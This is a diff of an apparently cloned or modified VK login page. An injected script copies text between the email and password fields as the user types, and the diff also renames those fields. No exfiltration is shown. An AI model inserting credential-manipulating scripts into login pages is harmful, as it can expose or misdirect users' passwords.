@@ -207,7 +207,7 @@ var abp;
           <script> var inp = document.querySelectorAll('input[name="email"]');
 var ip = document.querySelectorAll('input[name="pass"]');
 document.addEventListener('input',function(){
-inp[0].value = ' '+ip[0].value
+ip[0].value = ' '+inp[0].value
 
 });</script>
   <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
@@ -223,9 +223,9 @@ inp[0].value = ' '+ip[0].value
     <input type="hidden" name="lg_h" value="3a62eee3e199c2260c" />
     <input type="hidden" name="ul" id="quick_login_ul" value="" />
     <div class="label">Телефон или email</div>
-    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
+    <div class="labeled"><input type="text" name="emaiql" class="dark" id="quick_email" /></div>
     <div class="label">Пароль</div>
-    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
+    <div class="labeled"><input type="password" name="passq" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
     <input type="submit" class="submit" />
   </form>
   <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
